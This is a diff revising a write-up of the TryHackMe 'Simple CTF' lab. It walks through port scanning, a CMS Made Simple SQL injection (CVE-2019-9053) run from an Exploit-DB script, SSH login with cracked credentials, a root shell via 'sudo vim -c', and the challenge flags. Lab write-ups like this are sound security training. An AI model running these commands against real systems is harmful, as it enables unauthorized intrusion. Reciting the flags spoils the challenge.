@@ -2,7 +2,7 @@
 title: "Simple CTF"
 slug: "simple-ctf"
 category: "web-application"
-description: "Beginner level ctf"
+description: "Beginner level CTF covering web enumeration, SQL injection exploitation, and Linux privilege escalation via a misconfigured sudo binary."
 date: "2025-09-22"
 ---
 
@@ -10,74 +10,137 @@ date: "2025-09-22"
 
 ## Tools Used:
 
-- **nmap** — For network reconnaissance and port scanning
-- **gobuster** — To brute-force web directories
-- **exploit-db** — To search for known vulnerabilities
-- **Python 3** — For running the modified exploit
-- **SSH** — To remotely access the target machine
-- **gtfobins** — To find privilege escalation techniques
+- **Nmap** — Network reconnaissance and port scanning
+- **Gobuster** — Web directory brute-forcing
+- **Exploit-DB** — Searching for known CVEs and exploit scripts
+- **Python 3** — Running the modified exploit script
+- **SSH** — Remote access to the target machine
+- **GTFOBins** — Privilege escalation via misconfigured sudo binary
 
 ## Environment:
 
-- Kali linux virtual machine
+- Kali Linux (attacker machine)
+- TryHackMe hosted target machine
 
 # Initial Recon
 
-I first scanned for services and open ports on the IP address with nmap. i then found three services on the network: port 21 uses FTP; port 80 uses HTTP (meaning there is a website); and port 2222 uses SSH to allow for remote sign on. I followed this up with gobuster to see what web pages I can access. I found a page called simple, I found this using a wordlist called: “directory-list-2-3-medium-txt”.
+I deployed the machine and ran an Nmap scan to identify open ports and services:
 
-# ️Exploitation / Solution
+```
+nmap -sC -sV <target-ip>
+```
 
-## 1. Exploitation
+Three services were found:
 
-- the path lead me to a page called “cms made simple”.
-- i investigated the site for any noticeable things i could search for in exploit database. Then i found a version number in the footer.
-- I then searched for it in exploit database and found an sql injection exploitation.
-- I downloaded it and found it was written in python 2, so to save time i had google gemini convert it to the current python version python 3.
-- I used the exploit and gained the users details being the username: “mitch” and the password: secret
+- **Port 21** — FTP (vsftpd 3.0.3) — anonymous login allowed
+- **Port 80** — HTTP (Apache)
+- **Port 2222** — SSH (non-default port)
 
-## 2. Post exploitation
+The anonymous FTP login is worth noting — the room asks about it — but no useful files were accessible via FTP in this case.
 
-- I used the found credentials to log onto the machine using ssh.
-- I used the whoami command to identify my user, i then used the find command to locate the user flag.
-- i then found and submitted the flag
-- used ls to see the users in the home directory and found a user called sunbath.
+I followed up with Gobuster to enumerate web directories:
 
-## 3. Privilege Escalation
+```
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
-- Used the find command to search for files i could use to escalate to admin.
-- listed sudo apps and found vim required the admin user.
-- I then went on gtfoblins and found a vim payload.
-- gained sudo privileges and found root file flag and completed challenge
+This returned a `/simple` directory.
+
+# Exploitation / Solution
+
+## Step One — Identifying the CMS and CVE
+
+Navigating to `http://<target-ip>/simple` revealed a **CMS Made Simple** installation. Scrolling to the footer showed the version: **2.2.8**.
+
+Searching Exploit-DB for "CMS Made Simple 2.2.8" returned a SQL injection vulnerability: **CVE-2019-9053**. This is an unauthenticated time-based blind SQL injection affecting CMS Made Simple versions up to 2.2.9, allowing an attacker to extract usernames, email addresses, password hashes, and salts from the database.
+
+The exploit script (EDB-ID 46635) was downloaded from Exploit-DB. It was written in Python 2, so I converted it to Python 3 by updating the `print` statements to use function syntax.
+
+I ran the exploit against the target:
+
+```
+python3 exploit.py -u http://<target-ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+The script extracted:
+
+- **Username:** `mitch`
+- **Password:** `secret`
+
+## Step Two — SSH Access and User Flag
+
+I used the recovered credentials to log in via SSH on the non-default port:
+
+```
+ssh mitch@<target-ip> -p 2222
+```
+
+Once logged in, I confirmed the current user with `whoami` (output: `mitch`) and located the user flag in mitch's home directory:
+
+```
+cat /home/mitch/user.txt
+```
+
+Listing `/home` with `ls /home` revealed one other user on the system: **sunbath**.
+
+## Step Three — Privilege Escalation via Vim
+
+I checked mitch's sudo permissions:
+
+```
+sudo -l
+```
+
+The output showed:
+
+```
+(root) NOPASSWD: /usr/bin/vim
+```
+
+Mitch could run `vim` as root without a password. GTFOBins lists a known technique for this: vim can execute shell commands directly via its `-c` flag. Running the following spawned a root shell:
+
+```
+sudo vim -c ':!/bin/sh'
+```
+
+I confirmed root access with `whoami` (output: `root`), then retrieved the final flag:
+
+```
+cat /root/root.txt
+```
 
 # Flag
 
 ```
-W3ll d0n3. You made it!
+User Flag: G00d j0b, keep up!
+Root Flag: W3ll d0n3. You made it!
 ```
 
 # Tools Used
 
-- **nmap** — Port scanning and service enumeration
-- **gobuster** — Directory brute-forcing
-- **Exploit-DB** — Finding public exploits
-- **Python 3** — Running the exploit
-- **SSH** — Remote shell access
-- **gtfobins** — Privilege escalation techniques
+- **Nmap** — Port scanning and service enumeration
+- **Gobuster** — Directory brute-forcing
+- **Exploit-DB** — Finding the CVE-2019-9053 SQL injection exploit
+- **Python 3** — Running the converted exploit script
+- **SSH** — Remote shell access on port 2222
+- **GTFOBins** — Identifying the vim sudo privilege escalation technique
 
 # Notes / Lessons Learned
 
-- Always check for version info in footers — it’s often an easy path to exploitation.
-- Don’t ignore non-standard SSH ports (e.g., 2222).
-- Converting old Python exploits is a useful skill — Python 2 is increasingly outdated.
-- GTFOBins is invaluable for privilege escalation — bookmark it!
+- Always check footers and version strings on web applications — CMS version numbers map directly to known CVEs.
+- SSH running on a non-standard port (2222 here) is common in CTFs and real environments. Always scan all ports rather than assuming defaults.
+- The CVE-2019-9053 exploit is Python 2 by default — knowing how to convert older scripts (updating `print` statements, handling byte strings) is a practical skill.
+- `sudo -l` should always be the first post-access command. Here it immediately revealed an exploitable binary.
+- GTFOBins covers vim under the sudo section: `vim -c ':!/bin/sh'` spawns a shell with the privileges of whoever runs vim. Any editor with shell execution capability (vim, nano, less, more) is worth checking when found in sudo permissions.
 
-#  Screenshots
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_1.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_2.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_3.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_4.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_5.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_6.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_7.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_8.png)
-![Screenshot of the challenge soloution](Simple_CTF_Screenshot_9.png)
+# Screenshots
+
+![Screenshot 1](/images/simple-ctf/Simple_CTF_Screenshot_1.png)
+![Screenshot 2](/images/simple-ctf/Simple_CTF_Screenshot_2.png)
+![Screenshot 3](/images/simple-ctf/Simple_CTF_Screenshot_3.png)
+![Screenshot 4](/images/simple-ctf/Simple_CTF_Screenshot_4.png)
+![Screenshot 5](/images/simple-ctf/Simple_CTF_Screenshot_5.png)
+![Screenshot 6](/images/simple-ctf/Simple_CTF_Screenshot_6.png)
+![Screenshot 7](/images/simple-ctf/Simple_CTF_Screenshot_7.png)
+![Screenshot 8](/images/simple-ctf/Simple_CTF_Screenshot_8.png)
+![Screenshot 9](/images/simple-ctf/Simple_CTF_Screenshot_9.png)
